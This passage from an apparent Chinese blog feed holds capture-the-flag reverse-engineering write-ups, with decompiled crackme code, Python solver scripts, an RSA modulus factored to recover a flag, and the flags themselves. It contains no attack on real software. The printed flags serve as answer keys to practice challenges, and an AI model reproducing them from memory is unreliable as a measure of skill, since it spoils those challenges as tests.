class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v4; ++i )</span><br><span class="line">    v5[i] = *(_DWORD *)(<span class="hljs-number">4LL</span> * (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">sub_400936</span>(flag[i]) + that_girl);</span><br><span class="line">  <span class="hljs-built_in">sub_400D33</span>((<span class="hljs-keyword">unsigned</span> __int8 *)v5);</span><br><span class="line">  <span class="hljs-built_in">sub_400DB4</span>(v5, v4);</span><br><span class="line">  <span class="hljs-built_in">writefile</span>((__int64)v5, <span class="hljs-string">"out"</span>, v4);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先就是一个换表，然后就是两个函数的操作之后输出到了<code>out</code>文件里面，这个是我们已知的，再去看看两个关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_400D33</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> __int8 *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 result; <span class="hljs-comment">// rax</span></span><br><span class="line">  _BYTE v2[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+13h] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_DWORD *)v2 = *a1;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( dword_6020A0[*(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2[<span class="hljs-number">1</span>]] )</span><br><span class="line">  {</span><br><span class="line">    a1[*(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2[<span class="hljs-number">1</span>]] = a1[dword_6020A0[*(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2[<span class="hljs-number">1</span>]]];</span><br><span class="line">    *(_DWORD *)&amp;v2[<span class="hljs-number">1</span>] = dword_6020A0[*(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2[<span class="hljs-number">1</span>]];</span><br><span class="line">  }</span><br><span class="line">  result = v2[<span class="hljs-number">0</span>];</span><br><span class="line">  a1[*(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> *)&amp;v2[<span class="hljs-number">1</span>]] = v2[<span class="hljs-number">0</span>];</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这是一个简单的次序上的调整，可以很快的逆出来</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">_BYTE *__fastcall <span class="hljs-title">sub_400DB4</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  _BYTE *result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+17h] [rbp-5h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1 &gt;&gt; <span class="hljs-number">5</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; a2 - <span class="hljs-number">1</span> &gt; i; ++i )</span><br><span class="line">    a1[i] = <span class="hljs-number">8</span> * a1[i] | (a1[i + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>);</span><br><span class="line">  result = &amp;a1[i];</span><br><span class="line">  *result = <span class="hljs-number">8</span> * *result | v3;</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数里有些很有意思的操作，这个或操作看着很熟悉，这是显然是一个换位的操作，但是这里用了前一个数和后一个数之间的交错换位，逆起来就有了一些难度。</p><p>我也看过一些其他大佬的wp，这里普遍都是采用了爆破的方法，我不是很喜欢，虽然爆破可能更加省时省力，我还是想更加加深一下逆向位运算的熟练程度。</p><p>经过观察我们可以很轻松的发现，只需要将所有的数拆成两部分，再按照反方向运算回去就可以了，非常简单。</p><p>这样的话所有的内容就分析完了，这里我用python来做的逆向（后悔没有用C++）</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sub_400936</span>(<span class="hljs-params">a1</span>):</span></span><br><span class="line">    result = a1 - <span class="hljs-number">10</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">10</span>:</span><br><span class="line">        result = a1 + <span class="hljs-number">35</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> a1 == <span class="hljs-number">33</span> <span class="hljs-keyword">or</span> a1 == <span class="hljs-number">34</span>:</span><br><span class="line">        result = a1 + <span class="hljs-number">10</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">39</span>:</span><br><span class="line">        result = a1 + <span class="hljs-number">2</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">44</span>:</span><br><span class="line">        result = a1 - <span class="hljs-number">4</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">46</span>:</span><br><span class="line">        result = a1 - <span class="hljs-number">7</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">58</span> <span class="hljs-keyword">or</span> a1 == <span class="hljs-number">59</span>:</span><br><span class="line">        result = a1 - <span class="hljs-number">21</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">63</span>:</span><br><span class="line">        result = a1 - <span class="hljs-number">27</span></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 == <span class="hljs-number">95</span>:</span><br><span class="line">        result = a1 - <span class="hljs-number">49</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> a1 &lt;= <span class="hljs-number">47</span> <span class="hljs-keyword">or</span> a1 &gt; <span class="hljs-number">48</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> a1 &lt;= <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> a1 &gt; <span class="hljs-number">90</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-number">96</span> &lt; a1 &lt;= <span class="hljs-number">122</span>:</span><br><span class="line">                result = a1 - <span class="hljs-number">87</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            result = a1 - <span class="hljs-number">55</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        result = a1 - <span class="hljs-number">48</span></span><br><span class="line">    <span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_that_girl</span>():</span></span><br><span class="line">    adic = {}</span><br><span class="line">    fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">"that_girl"</span>, <span class="hljs-string">"r"</span>)</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">        data = fp.read(<span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            data = sub_400936(<span class="hljs-built_in">ord</span>(data))</span><br><span class="line">            <span class="hljs-keyword">if</span> data <span class="hljs-keyword">in</span> adic:</span><br><span class="line">                adic[data] = adic[data] + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                adic[data] = <span class="hljs-number">1</span></span><br><span class="line">    fp.close()</span><br><span class="line">    <span class="hljs-keyword">return</span> adic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">table</span>():</span></span><br><span class="line">    t = {}</span><br><span class="line">    <span class="hljs-keyword">for</span> ia <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</span><br><span class="line">        t[sub_400936(ia)] = ia</span><br><span class="line">    <span class="hljs-keyword">return</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1 = [<span class="hljs-number">0xec</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x2b</span>,</span><br><span class="line">      <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x41</span>]</span><br><span class="line">target = []</span><br><span class="line">part1 = []</span><br><span class="line">part2 = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a1)):</span><br><span class="line">    part2.append((a1[i] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xff</span>)</span><br><span class="line">    part1.append((a1[i] &lt;&lt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span>)</span><br><span class="line">target.append(part2[<span class="hljs-number">0</span>] | part1[<span class="hljs-built_in">len</span>(a1) - <span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(a1)):</span><br><span class="line">    target.append(part2[i] | part1[i - <span class="hljs-number">1</span>])</span><br><span class="line"></span><br><span class="line">dword_6020A0 = [<span class="hljs-number">22</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">30</span>, <span class="hljs-number">24</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">21</span>, <span class="hljs-number">7</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>, <span class="hljs-number">20</span>, <span class="hljs-number">16</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">25</span>, <span class="hljs-number">36</span>,</span><br><span class="line">                <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">37</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">26</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>]</span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line">index = []</span><br><span class="line"><span class="hljs-keyword">while</span> (dword_6020A0[i]):</span><br><span class="line">    index.append(i)</span><br><span class="line">    i = dword_6020A0[i]</span><br><span class="line">index.append(<span class="hljs-number">1</span>)</span><br><span class="line">index.reverse()</span><br><span class="line"></span><br><span class="line">a2 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(index))]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:</span><br><span class="line">    <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:</span><br><span class="line">        a2[<span class="hljs-number">0</span>] = target[i]</span><br><span class="line">    a2[i] = target[dword_6020A0.index(i)]</span><br><span class="line"></span><br><span class="line">dic = get_that_girl()</span><br><span class="line">dic_ = {v: k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> dic.items()}</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">'QCTF{'</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a2:</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(table()[dic_[i]])</span><br><span class="line">flag += <span class="hljs-string">'}'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>最后一部分最开始是打算爆破，但是想到了一种更简便的方法，就是先把所有的ASCII码值遍历一遍，制作一个表，可以避免双重循环爆破，虽然实际上爆破也并不麻烦。</p><p>最后输出flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">QCTF</span><span class="hljs-template-variable">{that_girl_saying_no_for_your_vindicate}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>找一道比较简单的题目保持一下做题的感觉</p><p>用Ghidra打开，部分函数的签名有问题，有时候将RDX误当作函数的参数，但是函数只需要两个参数，这里我打开IDA看了一下，IDA做的要比Ghidra好很多，根据汇编修改了一下函数签名，看一下主要的函数部分。</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00100a21</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar1;</span><br><span class="line">  <span class="hljs-keyword">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined local_4a8 [<span class="hljs-number">16</span>];</span><br><span class="line">  undefined local_498 [<span class="hljs-number">16</span>];</span><br><span class="line">  undefined local_488 [<span class="hljs-number">16</span>];</span><br><span class="line">  undefined local_478 [<span class="hljs-number">16</span>];</span><br><span class="line">  undefined local_468 [<span class="hljs-number">112</span>];</span><br><span class="line">  undefined local_3f8 [<span class="hljs-number">1000</span>];</span><br><span class="line">  <span class="hljs-keyword">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"[sign in]"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[input your flag]: "</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00100c26,local_468);</span><br><span class="line">                    <span class="hljs-comment">/* 字符串转16进制 */</span></span><br><span class="line">  <span class="hljs-built_in">FUN_0010096a</span>(local_468,local_3f8);</span><br><span class="line">  __gmpz_init_set_str(local_478,<span class="hljs-string">"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35"</span>,</span><br><span class="line">                      <span class="hljs-number">0x10</span>);</span><br><span class="line">  __gmpz_init_set_str(local_488,local_3f8,<span class="hljs-number">0x10</span>);</span><br><span class="line">  __gmpz_init_set_str(local_4a8,</span><br><span class="line">                                            </span><br><span class="line">                      <span class="hljs-string">"103461035900816914121390101299049044413950405173712170434161686539878160984549"</span></span><br><span class="line">                      ,<span class="hljs-number">10</span>);</span><br><span class="line">  __gmpz_init_set_str(local_498,<span class="hljs-string">"65537"</span>,<span class="hljs-number">10</span>);</span><br><span class="line">  __gmpz_powm(local_488,local_488,local_498,local_4a8);</span><br><span class="line">  iVar1 = __gmpz_cmp(local_488,local_478);</span><br><span class="line">  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"TTTTTTTTTTql!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"GG!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) {</span><br><span class="line">                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先是需要我们输入字符串，然后进行了一些大数的操作，这里是利用了一个库，查了一下mannual，很好理解，输入之后有一个函数对我们输入的字符串进行了一些操作，进入这个函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_0010096a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> sVar1;</span><br><span class="line">  <span class="hljs-keyword">int</span> local_20;</span><br><span class="line">  <span class="hljs-keyword">int</span> local_1c;</span><br><span class="line">  </span><br><span class="line">  local_20 = <span class="hljs-number">0</span>;</span><br><span class="line">  local_1c = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) {</span><br><span class="line">    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);</span><br><span class="line">    <span class="hljs-keyword">if</span> (sVar1 &lt;= (ulong)(<span class="hljs-keyword">long</span>)local_20) <span class="hljs-keyword">break</span>;</span><br><span class="line">    *(undefined *)(local_1c + param_2) = (&amp;DAT_00302010)[(<span class="hljs-keyword">int</span>)(param_1[local_20] &gt;&gt; <span class="hljs-number">4</span>)];</span><br><span class="line">    *(undefined *)((<span class="hljs-keyword">long</span>)local_1c + <span class="hljs-number">1</span> + param_2) =</span><br><span class="line">         (&amp;DAT_00302010)[(<span class="hljs-keyword">int</span>)((<span class="hljs-keyword">int</span>)param_1[local_20] &amp; <span class="hljs-number">0xf</span>)];</span><br><span class="line">    local_20 = local_20 + <span class="hljs-number">1</span>;</span><br><span class="line">    local_1c = local_1c + <span class="hljs-number">2</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看到分别取低四位和高四位的操作之后立刻反应过来是把字符串转换为16进制串，耐心看一下很好理解。</p><p>回到主函数，看到乘幂取模操作，发现是RSA，用yafu分解一下<code>103461035900816914121390101299049044413950405173712170434161686539878160984549</code></p><p>分解的也很快，这个数还是不够大</p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">prp39</span> = <span class="hljs-number">282164587459512124844245113950593348271</span></span><br><span class="line"><span class="hljs-attr">prp39</span> = <span class="hljs-number">366669102002966856876605669837014229419</span></span><br></pre></td></tr></tbody></table></figure><p>然后可以直接在线解密也是可以解出来的，由于gmpy2安装不上，直接在线解密了</p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf{<span class="hljs-symbol">Pwn_@</span>_hundred_years}</span><br></pre></td></tr></tbody></table></figure><h4 id="key"><a href="#key" class="headerlink" title="key"></a>key</h4><p>过程很复杂，动态调试绕过文件检测之后调试出flag</p><figure class="highlight coq hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idg_cni~bjbfi|<span class="hljs-type">gsxb</span></span><br></pre></td></tr></tbody></table></figure><h4 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h4><p>题目还是很不错，逻辑很清楚，仔细观察可以看出来杨辉三角就解决了，一共20层，全部组合起来取md5就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span>(<span class="hljs-params">line</span>):</span>  <span class="hljs-comment"># 生成杨辉三角的一行</span></span><br><span class="line">    L = [<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(line)):</span><br><span class="line">        L.append(line[x] + line[x - <span class="hljs-number">1</span>])</span><br><span class="line">    L.append(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> L</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">L = [<span class="hljs-number">1</span>]</span><br><span class="line">raw_flag = <span class="hljs-string">'1'</span></span><br><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):</span><br><span class="line">    L = create(L)</span><br><span class="line">    raw_flag += <span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> L])</span><br><span class="line"><span class="hljs-comment"># print(raw_flag)</span></span><br><span class="line">m = hashlib.md5(raw_flag.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">'RCTF{'</span> + m + <span class="hljs-string">'}'</span>)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">RCTF</span>{<span class="hljs-number">37894</span>beff<span class="hljs-number">1</span>c<span class="hljs-number">632010</span>dd<span class="hljs-number">6</span>d<span class="hljs-number">524</span>aa<span class="hljs-number">9604</span>db}</span><br></pre></td></tr></tbody></table></figure><h4 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h4><p>没想到会用pwntools去爆破一道逆向题……</p><p>感觉有些复杂，无脑爆破得到结果</p><h4 id="catch-me"><a href="#catch-me" class="headerlink" title="catch-me"></a>catch-me</h4><p>这题用了<code>sse</code>算法，而且整个过程非常复杂，所以猜测了一下其中的两个数相同，然后得到了flag</p><h4 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h4><p>首先脱壳，然后观察IDA，发现函数很多进行了很多次的异或运算，因此选择直接动态调试，调试到关键函数的最后发现几个运算是算出了flag的三个部分，拼接得到flag</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（三）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
